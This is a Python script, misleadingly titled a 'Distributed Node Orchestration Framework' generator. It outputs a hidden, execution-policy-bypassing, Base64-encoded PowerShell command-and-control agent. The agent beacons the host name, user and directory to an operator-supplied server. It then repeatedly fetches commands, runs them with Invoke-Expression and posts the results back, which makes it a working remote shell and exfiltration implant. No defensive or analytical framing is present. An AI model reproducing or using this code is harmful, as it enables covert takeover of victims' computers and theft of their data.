#!/usr/bin/env python3
"""
Distributed Node Orchestration Framework — Generator  (v6 — compact PS)

Generates a Base64-encoded PowerShell payload with no backtick-continuation
blank-line bugs. All Invoke-WebRequest calls are single-line.
"""

import argparse
import base64

PATH_SEP = "---PATH_SEP---"


def generate_ps_payload(ip: str, port: int) -> str:
    ps_script = f"""$currentPath = $PWD.Path
$info = "$env:COMPUTERNAME|" + (whoami).Trim() + "|$currentPath"
$b64Info = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($info))
try {{ Invoke-WebRequest -Uri "http://{ip}:{port}/checkin" -Method Post -Body $b64Info -ContentType "text/plain" -UseBasicParsing | Out-Null }} catch {{}}
while ($true) {{
    try {{
        Set-Location $currentPath
        $headers = @{{ "X-Agent-CWD" = $currentPath }}
        $response = Invoke-WebRequest -Uri "http://{ip}:{port}/get_task" -Headers $headers -UseBasicParsing
        $cmd = $response.Content.Trim()
        if ($cmd) {{
            $output = ""
            if ($cmd -match '^cd(\s|$)') {{
                $target = ($cmd -replace '^cd\s*', '').Trim()
                if ($target -eq '' -or $target -eq '~') {{ $target = $HOME }}
                elseif (-not [System.IO.Path]::IsPathRooted($target)) {{ $target = Join-Path $currentPath $target }}
                $target = $target.Replace('/', '\')
                try {{
                    Set-Location -LiteralPath $target
                    $currentPath = (Get-Location).Path
                    $output = "[+] $currentPath"
                }} catch {{ $output = "[-] cd failed: $_" }}
            }} else {{
                Set-Location $currentPath
                try {{
                    $output = Invoke-Expression $cmd 2>&1 | Out-String
                    if (-not $output.Trim()) {{ $output = "(no output)" }}
                }} catch {{ $output = "ERROR: $_" }}
                $currentPath = (Get-Location).Path
            }}
            $payload = $output + "{PATH_SEP}" + $currentPath
            $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload))
            Invoke-WebRequest -Uri "http://{ip}:{port}/submit_result" -Method Post -Body $b64 -ContentType "text/plain" -UseBasicParsing | Out-Null
        }}
    }} catch {{}}
    Start-Sleep -Seconds 3
}}"""

    ps_bytes = ps_script.encode('utf-16le')
    ps_b64   = base64.b64encode(ps_bytes).decode('utf-8')
    return f"powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Enc {ps_b64}"


def main():
    parser = argparse.ArgumentParser(
        description="Generate a PowerShell agent payload (v6 — compact IEX)."
    )
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True, type=int)
    args    = parser.parse_args()
    payload = generate_ps_payload(args.host, args.port)
    print(f"\n[*] C2: http://{args.host}:{args.port}")
    print("\n[+] Payload:\n")
    print(payload)
    print()


if __name__ == "__main__":
    main()
